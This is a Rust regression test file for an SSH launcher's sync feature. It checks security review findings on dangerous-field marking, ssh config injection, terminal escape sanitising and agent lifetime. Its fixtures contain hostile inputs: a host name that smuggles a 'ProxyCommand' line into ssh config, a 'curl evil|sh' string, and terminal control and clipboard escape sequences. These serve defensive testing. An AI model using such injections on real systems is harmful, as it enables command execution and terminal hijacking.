//! Regression tests for the application-surface review, round 1 (findings F1, F2, F5, F7, F9 of
//! host-sync-plan/review/app-round1.md): foreign text in the hop config and in review screens,
//! the review of group, identity and Red changes, the private agent's lifetime.

use crate::credentials::{identity_key, SecretGate};
use crate::store::LauncherStore;
use crate::sync::crypto::DeviceIdentity;
use crate::sync::oplog::{
    Attendance, CertScope, DeviceKind, DeviceRole, GroupFields, HostFields, IdentityFields, OpBody,
    ThirdFactor, VerifiedBy,
};
use std::process::Command;
use zeroize::Zeroizing;

fn view_of(body: OpBody) -> crate::app::sync::PendingOpView {
    let store = LauncherStore::open_in_memory().unwrap();
    let id = DeviceIdentity::generate();
    store
        .sync_register_device(
            &id.public(),
            "laptop",
            DeviceRole::Holder,
            Attendance::Attended,
            DeviceKind::Terminal,
            VerifiedBy::Sas,
        )
        .unwrap();
    let op = store.sync_append_local(&id, body).unwrap();
    let rows = store.sync_devices().unwrap();
    crate::app::sync_view::pending_view(&store, &op, &rows, None)
}

#[test]
fn f2_group_review_lists_every_set_field_with_the_dangerous_ones_marked() {
    let v = view_of(OpBody::GroupUpsert {
        group_uid: [2; 16],
        fields: GroupFields {
            name: Some("ops".into()),
            default_proxy_jump: Some(Some("evil.example".into())),
            default_username: Some(Some("root".into())),
            default_port: Some(Some(2222)),
            ..Default::default()
        },
    });
    let by = |f: &str| v.changes.iter().find(|c| c.field == f).unwrap();
    assert!(by("default_proxy_jump").dangerous && by("default_proxy_jump").to == "evil.example");
    assert!(by("default_username").dangerous && by("default_username").to == "root");
    assert!(by("default_port").dangerous);
    assert!(!by("name").dangerous, "the name is a Safe field");
    assert_eq!(
        v.summary, "change group ops",
        "the author already applied it locally"
    );
}

#[test]
fn f2_identity_review_lists_every_set_field_with_the_dangerous_ones_marked() {
    let v = view_of(OpBody::IdentityUpsert {
        identity_uid: [3; 16],
        fields: IdentityFields {
            name: Some("deploy".into()),
            username: Some(Some("root".into())),
            has_password: Some(true),
        },
    });
    let by = |f: &str| v.changes.iter().find(|c| c.field == f).unwrap();
    assert!(by("username").dangerous && by("username").to == "root");
    assert!(by("has_password").dangerous);
    assert!(!by("name").dangerous);
}

#[test]
fn f2_host_review_shows_group_and_identity_names_not_counts() {
    let store = LauncherStore::open_in_memory().unwrap();
    let group = store
        .create_group(&crate::store::NewHostGroup {
            name: "prod".into(),
            ..Default::default()
        })
        .unwrap();
    let guid = store.group_uid(group.id).unwrap().unwrap();
    let id = DeviceIdentity::generate();
    store
        .sync_register_device(
            &id.public(),
            "laptop",
            DeviceRole::Holder,
            Attendance::Attended,
            DeviceKind::Terminal,
            VerifiedBy::Sas,
        )
        .unwrap();
    let op = store
        .sync_append_local(
            &id,
            OpBody::HostUpsert {
                host_uid: [4; 16],
                fields: HostFields {
                    group_uids: Some(vec![guid, [0xee; 16]]),
                    ..Default::default()
                },
            },
        )
        .unwrap();
    let rows = store.sync_devices().unwrap();
    let v = crate::app::sync_view::pending_view(&store, &op, &rows, None);
    let c = v.changes.iter().find(|c| c.field == "group_uids").unwrap();
    assert!(c.dangerous);
    assert!(
        c.to.starts_with("prod, (unknown group eeeeeeee"),
        "{:?}",
        c.to
    );
}

#[test]
fn f2_red_changes_name_their_parameters() {
    let v = view_of(OpBody::BulkExport {
        requester: "aabbccddeeff0011".into(),
        window_secs: 3600,
    });
    assert!(
        v.summary.contains("3600") && v.summary.contains("aabbccdd"),
        "{}",
        v.summary
    );
    let v = view_of(OpBody::CertIssue {
        device_id: "aabbccddeeff0011".into(),
        scope: CertScope::Hosts(vec![[1; 16], [2; 16]]),
        expiry: i64::MAX / 4,
        max_new_hosts_per_day: 7,
        epoch_lo: 0,
        epoch_hi: 9,
    });
    assert!(
        v.summary.contains("aabbccdd")
            && v.summary.contains("2 hosts")
            && v.summary.contains("7 new hosts"),
        "{}",
        v.summary
    );
    let v = view_of(OpBody::DeviceRoleChange {
        device_id: "aabbccddeeff0011".into(),
        to: DeviceRole::Holder,
    });
    assert!(
        v.summary.contains("aabbccdd") && v.summary.contains("holder"),
        "{}",
        v.summary
    );
    let v = view_of(OpBody::ExemptionSet {
        device_id: "aabbccddeeff0011".into(),
        slot: None,
    });
    assert!(
        v.summary.contains("switch off") && v.summary.contains("aabbccdd"),
        "{}",
        v.summary
    );
    let v = view_of(OpBody::FactorRegister {
        factor: ThirdFactor::EmailCode,
        public: [1; 32],
        sealed: vec![],
        salt: [0; 16],
        sender: Some("aabbccddeeff0011".into()),
    });
    assert!(
        v.summary.contains("emailed code") && v.summary.contains("aabbccdd"),
        "{}",
        v.summary
    );
}

fn agent_ready() -> bool {
    Command::new("ssh-agent").arg("-V").output().is_ok()
        && Command::new("ssh-keygen").arg("-V").output().is_ok()
}

fn gate_with_key(id: i64) -> SecretGate {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("k");
    assert!(Command::new("ssh-keygen")
        .args(["-q", "-t", "ed25519", "-N", "", "-C", "t", "-f"])
        .arg(&file)
        .status()
        .unwrap()
        .success());
    let pem = std::fs::read_to_string(&file).unwrap();
    let gate = SecretGate::default();
    gate.insert_private_key(&identity_key(id), Zeroizing::new(pem))
        .unwrap();
    gate
}

#[test]
fn f1_a_synced_host_name_that_is_not_a_plain_host_name_gets_no_ssh_config_block() {
    if !agent_ready() {
        return;
    }
    let evil = "hop\n    ProxyCommand touch /tmp/review-pwned";
    // The name still arrives (a Safe field); it must not reach the ssh config.
    let _gate = gate_with_key(88);
    crate::credentials::note_hop_identity(evil, 88);
    assert!(
        crate::credentials::hop_agent_config(evil).is_none(),
        "no block, no config for a name with a newline"
    );
    // The same key under a plain name does get its block (the control case).
    crate::credentials::note_hop_identity("review-hop", 88);
    let config = crate::credentials::hop_agent_config(&format!("review-hop,{evil}")).unwrap();
    let text = std::fs::read_to_string(config).unwrap();
    assert!(text.contains("Host review-hop\n"));
    assert!(
        !text
            .lines()
            .any(|l| l.trim_start().starts_with("ProxyCommand")),
        "{text}"
    );
}

#[test]
fn f7_control_characters_of_foreign_text_are_escaped_for_the_terminal() {
    let raw = "curl evil|sh\x1b[2K\r\x1b[1Aok \x1b]52;c;ZXZpbA==\x07 c1:\u{9b}x \u{7f}";
    let shown = crate::cli::theme::sanitize_foreign(raw);
    assert!(!shown.chars().any(|c| c.is_control()), "{shown:?}");
    assert!(shown.contains("\\u{001b}[2K") && shown.contains("\\u{009b}"));
    // Plain text, including non-ASCII letters above the C1 range, is untouched.
    assert_eq!(
        crate::cli::theme::sanitize_foreign("héllo wörld"),
        "héllo wörld"
    );
}

/// Helper process for the agent lifetime test: holds a private agent with a key until killed.
#[test]
fn f5_agent_holder() {
    let Some(out) = std::env::var_os("REVIEW_AGENT_HOLDER") else {
        return;
    };
    let _gate = gate_with_key(5);
    let sock = crate::credentials::synced_identity_agent(5).unwrap().socket;
    std::fs::write(&out, sock.to_string_lossy().as_bytes()).unwrap();
    loop {
        std::thread::sleep(std::time::Duration::from_secs(1));
    }
}

fn listed(sock: &std::path::Path) -> String {
    Command::new("ssh-add")
        .arg("-L")
        .env("SSH_AUTH_SOCK", sock)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default()
}

fn killed_holder_leaves_nothing(signal: i32) {
    let dir = tempfile::tempdir().unwrap();
    let out = dir.path().join("sock");
    let mut holder = Command::new(std::env::current_exe().unwrap())
        .args([
            "--exact",
            "app::tests::review_round1::f5_agent_holder",
            "--nocapture",
        ])
        .env("REVIEW_AGENT_HOLDER", &out)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .unwrap();
    for _ in 0..200 {
        if out.exists() && !std::fs::read(&out).unwrap().is_empty() {
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    let sock =
        std::path::PathBuf::from(std::fs::read_to_string(&out).expect("holder never started"));
    assert!(
        listed(&sock).contains("ssh-ed25519"),
        "the agent holds the key while sshub lives"
    );
    // SAFETY: plain kill(2) on a child pid.
    unsafe { libc::kill(holder.id() as i32, signal) };
    let _ = holder.wait();
    let mut gone = false;
    for _ in 0..100 {
        if !listed(&sock).contains("ssh-ed25519") && !sock.parent().unwrap().exists() {
            gone = true;
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    if !gone {
        let _ = Command::new("pkill")
            .args(["-f", &format!("ssh-agent -D -a {}", sock.display())])
            .status();
        let _ = std::fs::remove_dir_all(sock.parent().unwrap());
    }
    assert!(
        gone,
        "signal {signal}: the agent or its directory outlived sshub"
    );
}

#[test]
fn f5_the_private_agent_does_not_outlive_sshub_killed_by_sigterm() {
    if agent_ready() {
        killed_holder_leaves_nothing(libc::SIGTERM);
    }
}

#[test]
fn f5_the_private_agent_does_not_outlive_sshub_killed_by_sigkill() {
    if agent_ready() {
        killed_holder_leaves_nothing(libc::SIGKILL);
    }
}
